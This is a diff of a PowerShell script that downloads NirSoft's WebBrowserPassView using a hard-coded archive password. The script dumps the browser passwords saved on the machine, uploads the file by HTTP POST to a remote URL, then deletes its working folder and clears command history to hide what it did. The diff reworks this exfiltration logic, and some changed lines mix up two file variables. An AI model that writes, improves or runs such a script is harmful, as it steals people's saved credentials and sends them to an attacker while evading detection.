@@ -7,10 +7,8 @@ $waitTime = 0
 
 mkdir \temp | Out-Null
 cd \temp
-# Base64 encoded credentials for Basic Auth
-$encodedCredentials = "ZG93bmxvYWQ6bmlyc29mdDEyMyE="  # Already encoded from 'download:nirsoft123!'
+$encodedCredentials = "ZG93bmxvYWQ6bmlyc29mdDEyMyE="
 
-# Define headers based on the raw request headers you provided
 $headers = @{
     "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
     "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
@@ -41,29 +39,30 @@ Invoke-WebRequest -Uri "https://www.nirsoft.net/protected_downloads/passreccomma
 iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip | Out-Null
 Expand-Archive 7z.zip | Out-Null
 .\7z\7za.exe e passreccommandline.zip -pnirsoft123! -y | Out-Null
-.\WebBrowserPassView.exe /stext pwds.txt
+.\WebBrowserPassView.exe /stext $fileName
 
 $boundary = [System.Guid]::NewGuid().ToString()
 $headers = @{
     "Content-Type" = "multipart/form-data; boundary=$boundary"
 }
 
-$body = @"
---$boundary
-Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
-Content-Type: application/octet-stream
-$(Get-Content -Raw $filePath)
---$boundary--
-"@
-
 while ($waitTime -lt $timeout) {
-    if ((Test-Path $filePath) -and ((Get-Item $filePath).length -gt 0)) {
+    if ((Test-Path $fileName) -and ((Get-Item $filePath).length -gt 0)) {
         break
     }
     Start-Sleep -Seconds 1
     $waitTime++
 }
+
+$body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
+Content-Type: application/octet-stream
+$(Get-Content -Raw $fileName)
+--$boundary--
+"@
+
 Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $body | Out-Null
-cd C:\
+cd \
 rm -R \temp
 Clear-History
